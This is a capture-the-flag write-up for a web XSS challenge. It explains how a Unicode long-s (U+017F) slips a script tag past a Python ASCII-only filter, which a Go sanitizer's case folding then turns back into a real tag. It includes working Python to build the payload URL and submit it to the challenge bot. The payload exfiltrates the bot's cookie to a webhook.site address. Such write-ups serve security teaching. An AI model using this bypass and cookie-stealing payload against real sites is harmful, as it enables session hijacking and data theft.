# Demolition — CTF Writeup

## Challenge

- **App**: https://demolition.breakable.live/
- **Bot**: https://demolition-bot.breakable.live/
- **Category**: Web (XSS)
- **Flag**: `CTF{7b5d3e42e57dab38821b5215138825098cbe965c67c131b6c64be1805626481d}`

## Overview

A web app with a "Render Pipeline" that processes user-supplied HTML through one of two engines (Python or Go). A bot visits user-submitted URLs with a `FLAG` cookie. The goal is to achieve XSS to steal the bot's cookie.

## Architecture

1. **Flask app (Python)** — serves the page, handles API endpoints
2. **Go sanitizer** — an internal microservice that sanitizes HTML, allowing only whitelisted tags
3. **Bot (Puppeteer)** — visits submitted URLs with the flag set as a cookie

## Vulnerability: Unicode Case-Folding Mismatch

The exploit abuses a difference in how Python and Go handle Unicode case folding.

### Python's script fence (bypass target)

```python
SCRIPT_FENCE_RE = re.compile(r"<\s*/?\s*script\b", re.IGNORECASE | re.ASCII)
```

The `re.ASCII` flag restricts case-insensitive matching to ASCII characters only. The character **ſ** (U+017F, Latin Small Letter Long S) is **not** treated as equivalent to `s` under ASCII-only matching. So `<ſcript>` passes right through the fence.

### Go's tag matching (exploitation target)

```go
func canonicalTag(name string, allow []string) string {
    for _, candidate := range allow {
        if strings.EqualFold(name, candidate) {
            return candidate
        }
    }
    return ""
}
```

Go's `strings.EqualFold` performs full **Unicode case folding**. Under Unicode rules, ſ (U+017F) folds to `s`. So `EqualFold("ſcript", "script")` returns `true`, and the sanitizer outputs a real `<script>` tag.

### Client-side execution

The client renders the Go sanitizer's HTML output via `innerHTML`, then `armScripts()` clones each `<script>` element so the browser actually executes them:

```javascript
els.rendered.innerHTML = data.html || "";
armScripts(els.rendered);
```

## Exploit

### Step 1 — Craft the URL

The URL uses two query parameters:

- `p=render.engine=go` — parsed by `parse_profile_blob()` into `{"render": {"engine": "go"}}`, which makes the client send the draft through the Go sanitizer
- `d=<ſcript>fetch("https://webhook.site/XXXX?c="+document.cookie)</ſcript>` — the XSS payload using ſ (U+017F) instead of `s`

```python
import urllib.parse

WEBHOOK = 'https://webhook.site/<your-token>'
CHALLENGE = 'https://demolition.breakable.live'

long_s = '\u017f'
draft = f'<{long_s}cript>fetch("{WEBHOOK}?c="+document.cookie)</{long_s}cript>'

params = {
    'p': 'render.engine=go',
    'd': draft,
}

exploit_url = CHALLENGE + '/?' + urllib.parse.urlencode(params)
```

### Step 2 — Submit to bot

```python
import requests

BOT = 'https://demolition-bot.breakable.live'
requests.post(f'{BOT}/api/submit', json={'url': exploit_url})
```

### Step 3 — Receive the flag

The bot visits the URL, the page auto-runs the render pipeline on load, the Go sanitizer converts `<ſcript>` → `<script>`, `armScripts()` executes it, and the cookie is exfiltrated:

```
FLAG=CTF{7b5d3e42e57dab38821b5215138825098cbe965c67c131b6c64be1805626481d}
```

## Request Flow

```
Browser loads /?p=render.engine=go&d=<ſcript>...
  │
  ├─ Flask: embeds params into window.__BOOT__
  │
  ├─ client.js: seed() → runRender() auto-fires
  │    ├─ GET /api/profile?p=render.engine=go → {"render":{"engine":"go"}, ...}
  │    ├─ forgeRuntime() picks engine="go"
  │    └─ POST /api/render {draft: "<ſcript>...", engine: "go"}
  │
  ├─ Flask /api/render:
  │    ├─ SCRIPT_FENCE_RE.search("<ſcript>...") → NO MATCH (re.ASCII)
  │    └─ Forwards to Go sanitizer
  │
  ├─ Go sanitizer:
  │    ├─ strings.EqualFold("ſcript", "script") → true
  │    └─ Returns: <script>fetch(...)</script>
  │
  └─ client.js:
       ├─ rendered.innerHTML = "<script>fetch(...)</script>"
       ├─ armScripts() re-creates <script> so it executes
       └─ Cookie exfiltrated to webhook
```
